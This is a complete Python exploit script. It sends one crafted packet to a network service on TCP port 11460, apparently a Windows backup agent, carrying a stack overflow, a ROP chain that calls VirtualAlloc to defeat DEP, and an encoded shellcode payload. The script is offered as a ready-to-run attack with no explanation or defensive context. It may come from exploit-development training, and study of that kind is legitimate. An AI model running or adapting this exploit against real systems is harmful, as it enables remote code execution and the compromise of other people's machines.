import socket
import sys
from struct import pack

# psAgentCommand
buf = bytearray([0x41]*0xC)
buf += pack("<i", 0x534)  # opcode
buf += pack("<i", 0x0)    # 1st memcpy: offset
buf += pack("<i", 0x500)  # 1st memcpy: size field
buf += pack("<i", 0x0)    # 2nd memcpy: offset
buf += pack("<i", 0x100)  # 2nd memcpy: size field
buf += pack("<i", 0x0)    # 3rd memcpy: offset
buf += pack("<i", 0x100)  # 3rd memcpy: size field
buf += bytearray([0x41]*0x8)

# psCommandBuffer
va  = pack("<L", (0x45454545)) # dummy VirutalAlloc Address
va += pack("<L", (0x46464646)) # Shellcode Return Address
va += pack("<L", (0x47474747)) # # dummy Shellcode Address
va += pack("<L", (0x48484848)) # dummy dwSize 
va += pack("<L", (0x49494949)) # # dummy flAllocationType 
va += pack("<L", (0x51515151)) # dummy flProtect 

offset = b"A" * (276 - len(va))
eip = pack("<L", (0x100113dd)) # pops ESP into EBX ; push esp ; sub eax, 0x20 ; pop ebx ; ret  ;
rop = pack("<L", (0x10024554)) # MOV EDX, EBX
rop += pack("<L", (0x42424242))
rop += pack("<L", (0x42424242))
rop += pack("<L", (0x42424242))
rop += pack("<L", (0x100189f0)) # MOV EAX, EDX
rop += pack("<L", (0x10010481)) # pop ECX
rop += pack("<L", (0xffffffe4)) # -0x1C
rop += pack("<L", (0x10012ef4)) # add eax, ecx ; pop esi ; ret
rop += pack("<L", (0x42424242)) # alignment
rop += pack("<L", (0x10012ca5)) # pop eax ; ret
rop += pack("<L", (0x100252e0))
rop += pack("<L", (0x10021c89)) # mov eax, dword [eax] ; ret
rop += pack("<L", (0x10020ff4)) # push edx; pop ecx (also shifts esp to right by 1 shr)
rop += pack("<L", (0x10012444)) # pop EBX
rop += pack("<L", (0xffffffe4)) # -0x1C
rop += pack("<L", (0x10016c9e)) # add edx, ebx ; retn 0x10
rop += pack("<L", (0x42424242))
rop += pack("<L", (0x10020ff4)) # push edx, pop ecx
rop += b'A' * 0x10
rop += pack("<L", (0x10017bbc)) # mov dword [ecx], eax

# patching rtrn
rop += pack("<L", (0x10010535)) # inc ecx
rop += pack("<L", (0x10010535)) # inc ecx
rop += pack("<L", (0x10010535)) # inc ecx
rop += pack("<L", (0x10010535)) # inc ecx
rop += pack("<L", (0x100237ac)) # mov eax, ecx ; retn 4
rop += pack("<L", (0x1001e49b)) # add EAX, 0x58
rop += b'A' * 0x4 # retn 4
rop += pack("<L", (0x1001e49b)) # 2/3
rop += pack("<L", (0x1001e49b)) # 3/3
rop += pack("<L", (0x1001e49b)) # 4/3
rop += pack("<L", (0x1001e49b)) # 5/3
rop += pack("<L", (0x10017bbc)) # overwrite the dummy shellcode

# patching arguments
rop += pack("<L", (0x10010535)) # inc ecx
rop += pack("<L", (0x10010535)) # inc ecx
rop += pack("<L", (0x10010535)) # inc ecx
rop += pack("<L", (0x10010535)) # inc ecx
rop += pack("<L", (0x100237ac)) # mov eax, ecx ; retn 4
rop += pack("<L", (0x1001e49b)) # ADD EAX, 0x58
rop += b'A' * 0x4
rop += pack("<L", (0x1001e49b))
rop += pack("<L", (0x1001e4a4)) # add eax, 0x54
rop += pack("<L", (0x10017bbc)) # mov dword [ecx], eax
rop += pack("<L", (0x10010535)) # inc ecx
rop += pack("<L", (0x10010535)) # inc ecx
rop += pack("<L", (0x10010535)) # inc ecx
rop += pack("<L", (0x10010535)) # inc ecx
rop += pack("<L", (0x10012ca5)) # pop EAX
rop += pack("<L", (0xffffffff)) # -1
rop += pack("<L", (0x10023779)) # neg eax ; retn 0x04
rop += pack("<L", (0x10017bbc)) # mov dword [ecx], eax
rop += b'A' * 0x4
rop += pack("<L", (0x10010535)) # inc ecx
rop += pack("<L", (0x10010535)) # inc ecx
rop += pack("<L", (0x10010535)) # inc ecx
rop += pack("<L", (0x10010535)) # inc ecx
rop += pack("<L", (0x10012ca5)) # pop EAX
rop += pack("<L", (0x80808080))
rop += pack("<L", (0x10010375)) # pop esi
rop += pack("<L", (0x7f7f8f80))
rop += pack("<L", (0x10011cca)) # add eax, esi
rop += pack("<L", (0x42424242))
rop += pack("<L", (0x10017bbc)) # mov dword [ecx], eax
rop += pack("<L", (0x10010535)) # inc ecx
rop += pack("<L", (0x10010535)) # inc ecx
rop += pack("<L", (0x10010535)) # inc ecx
rop += pack("<L", (0x10010535)) # inc ecx
rop += pack("<L", (0x10012ca5)) # pop EAX
rop += pack("<L", (0x80808080))
rop += pack("<L", (0x10010375)) # pop esi
rop += pack("<L", (0x7f7f7fc0))
rop += pack("<L", (0x10011cca)) # add eax, esi
rop += pack("<L", (0x42424242))
rop += pack("<L", (0x10017bbc)) # mov dword [ecx], eax

# Executing VirtualAlloc
rop += pack("<L", (0x10021660)) # mov eax, ecx ; retn 0x0008 ;
rop += pack("<L", (0x10012322)) #  pop esi ; ret 
rop += b"A"*8 # aligning for 0x0004
rop += pack("<L", (0xffffffec))
rop += pack("<L", (0x10011cca)) # add eax, esi ; pop esi ; ret
rop += pack("<L", (0x42424242))
rop += pack("<L", (0x1001587a)) # xchg eax,esp ; ret

shellcode = b"\x90" * 0x50
shellcode += b"\xbd\x74\xc3\x81\x81\xdd\xc5\xd9\x74\x24\xf4"
shellcode += b"\x58\x33\xc9\xb1\x59\x31\x68\x14\x03\x68\x14"
shellcode += b"\x83\xc0\x04\x96\x36\x7d\x69\xd9\xb9\x7e\x6a"
shellcode += b"\x85\x88\xac\x0e\xce\xb9\x60\x44\x82\x31\x08"
shellcode += b"\xbf\xa9\x18\x1e\xcb\xdf\xb4\x2f\x34\x10\x72"
shellcode += b"\x05\xec\x1f\xbc\x36\xcc\x3e\x40\x45\x01\xe0"
shellcode += b"\x79\x86\x54\xe1\xbe\x50\x12\x0e\x12\x34\x57"
shellcode += b"\x82\x83\x31\x25\x1e\xa5\x95\x21\x1e\xdd\x90"
shellcode += b"\xf6\xea\x51\x9a\x26\x99\x22\x84\x96\x16\xea"
shellcode += b"\x94\x17\xfb\x8e\x1c\x63\xc7\xa1\x61\xc5\xbc"
shellcode += b"\xf6\x16\xd7\x14\xc7\xe8\x19\x57\x25\x45\x98"
shellcode += b"\xa0\x0e\x75\xee\xda\x6c\x08\xe9\x19\x0e\xd6"
shellcode += b"\x7c\xbd\xa8\x9d\x27\x19\x48\x71\xb1\xea\x46"
shellcode += b"\x3e\xb5\xb4\x4a\xc1\x1a\xcf\x77\x4a\x9d\x1f"
shellcode += b"\xfe\x08\xba\xbb\x5a\xca\xa3\x9a\x06\xbd\xdc"
shellcode += b"\xfc\xef\x62\x79\x77\x1d\x74\xfd\x78\xdd\x79"
shellcode += b"\xa3\xee\x11\xb4\x5c\xee\x3d\xcf\x2f\xdc\xe2"
shellcode += b"\x7b\xb8\x6c\x6a\xa2\x3f\xe5\x7c\x55\xef\x4d"
shellcode += b"\xec\xab\x10\xad\x24\x68\x44\xfd\x5e\x59\xe5"
shellcode += b"\x96\x9e\x66\x30\x02\x95\xf0\x7b\x7a\x84\x98"
shellcode += b"\x14\x78\xd7\x99\x5f\xf5\x31\xc9\xcf\x55\xee"
shellcode += b"\xaa\xbf\x15\x5e\x43\xaa\x9a\x81\x73\xd5\x71"
shellcode += b"\xaa\x1e\x3a\x2f\x82\xb6\xa3\x6a\x58\x26\x2b"
shellcode += b"\xa1\x24\x68\xa7\x43\xd8\x27\x40\x26\xca\x50"
shellcode += b"\x37\xc8\x12\xa1\xd2\xc8\x78\xa5\x74\x9f\x14"
shellcode += b"\xa7\xa1\xd7\xba\x58\x84\x64\xbc\xa7\x59\x5c"
shellcode += b"\xb6\x9e\xcf\xe0\xa0\xde\x1f\xe0\x30\x89\x75"
shellcode += b"\xe0\x58\x6d\x2e\xb3\x7d\x72\xfb\xa0\x2d\xe7"
shellcode += b"\x04\x90\x82\xa0\x6c\x1e\xfc\x87\x32\xe1\x2b"
shellcode += b"\x94\x35\x1d\xa9\xb3\x9d\x75\x51\x84\x1d\x85"
shellcode += b"\x3b\x04\x4e\xed\xb0\x2b\x61\xdd\x39\xe6\x2a"
shellcode += b"\x75\xb3\x67\x98\xe4\xc4\xad\x7c\xb8\xc5\x42"
shellcode += b"\xa5\x4b\xbf\x2b\x5a\xac\x40\x22\x3f\xad\x40"
shellcode += b"\x4a\x41\x92\x96\x73\x37\xd5\x2a\xc0\x48\x60"
shellcode += b"\x0e\x61\xc3\x8a\x1c\x71\xc6"

shellcode += b"\x90" * (0x400 - 276 - 4 - len(rop) - len(shellcode))

formatString = b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" % (offset+va+eip+rop+shellcode,0,0,0,0)
buf += formatString

# Checksum
buf = pack(">i", len(buf)-4) + buf
def main():
        if len(sys.argv) != 2:
                print("Usage: %s <ip_address>\n" % (sys.argv[0]))
                sys.exit(1)

        server = sys.argv[1]
        port = 11460

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((server, port))

        s.send(buf)
        s.close()

        print("[+] Packet sent")
        sys.exit(0)


if __name__ == "__main__":
        main()
